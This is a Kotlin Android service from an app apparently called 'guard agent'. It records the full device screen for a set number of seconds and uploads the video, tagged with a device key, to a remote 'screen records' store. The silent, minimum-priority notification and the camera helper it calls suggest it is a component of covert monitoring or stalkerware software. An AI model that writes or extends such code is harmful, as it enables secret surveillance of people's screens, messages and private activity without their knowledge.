package com.guard.agent.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.guard.agent.R
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.helpers.media.CameraHelper
import com.guard.agent.utils.Logger
import java.io.File

class ScreenCaptureService : Service() {

    companion object {
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_DEVICE_KEY = "device_key"

        private const val TAG = "ScreenCapture"
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createChannel()
        startForegroundSafely()

        if (intent == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
        val resultData = if (Build.VERSION.SDK_INT >= 33) {
            intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(EXTRA_RESULT_DATA)
        }
        val duration = intent.getIntExtra(EXTRA_DURATION, Constants.DEFAULT_SCREEN_SECONDS)
        val deviceKey = intent.getStringExtra(EXTRA_DEVICE_KEY) ?: DeviceKey.get(this)

        if (resultCode == -1 || resultData == null) {
            Logger.e(TAG, "No MediaProjection data")
            stopSelf()
            return START_NOT_STICKY
        }

        startRecording(resultCode, resultData, duration, deviceKey)
        return START_NOT_STICKY
    }

    private fun startForegroundSafely() {
        val notif = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                Constants.SCREEN_CAPTURE_NOTIF_ID,
                notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(Constants.SCREEN_CAPTURE_NOTIF_ID, notif)
        }
    }

    private fun startRecording(
        resultCode: Int,
        resultData: Intent,
        duration: Int,
        deviceKey: String
    ) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(resultCode, resultData)

            val metrics = getScreenMetrics()
            val width = metrics.first
            val height = metrics.second
            val dpi = resources.displayMetrics.densityDpi

            val file = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(4_000_000)
                setOutputFile(file.absolutePath)
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "GuardScreen",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder!!.surface,
                null, null
            )

            mediaRecorder?.start()
            Logger.d(TAG, "Recording started — ${duration}s")

            // Duration ke baad stop
            android.os.Handler(mainLooper).postDelayed({
                stopRecording(deviceKey, file)
            }, duration * 1000L)

        } catch (e: Exception) {
            Logger.e(TAG, "Start failed", e)
            stopSelf()
        }
    }

    private fun stopRecording(deviceKey: String, file: File) {
        try {
            mediaRecorder?.stop()
        } catch (_: Exception) {}
        try {
            mediaRecorder?.release()
        } catch (_: Exception) {}
        mediaRecorder = null

        try {
            virtualDisplay?.release()
        } catch (_: Exception) {}
        virtualDisplay = null

        try {
            mediaProjection?.stop()
        } catch (_: Exception) {}
        mediaProjection = null

        if (file.exists() && file.length() > 0) {
            Logger.d(TAG, "Uploading: ${file.length()} bytes")
            CameraHelper.upload(this, deviceKey, file, Constants.SUB_SCREEN_RECORDS)
        }

        stopSelf()
    }

    private fun getScreenMetrics(): Pair<Int, Int> {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            // Even numbers zaroori hain H264 ke liye
            val w = bounds.width() and 0xFFFFFFFE.toInt()
            val h = bounds.height() and 0xFFFFFFFE.toInt()
            Pair(w, h)
        } else {
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            val w = metrics.widthPixels and 0xFFFFFFFE.toInt()
            val h = metrics.heightPixels and 0xFFFFFFFE.toInt()
            Pair(w, h)
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (mgr.getNotificationChannel(Constants.CHANNEL_ID) == null) {
                val ch = NotificationChannel(
                    Constants.CHANNEL_ID,
                    getString(R.string.channel_name),
                    NotificationManager.IMPORTANCE_MIN
                )
                mgr.createNotificationChannel(ch)
            }
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, Constants.CHANNEL_ID)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText("Screen recording")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    override fun onDestroy() {
        try { mediaRecorder?.release() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
        super.onDestroy()
    }
}
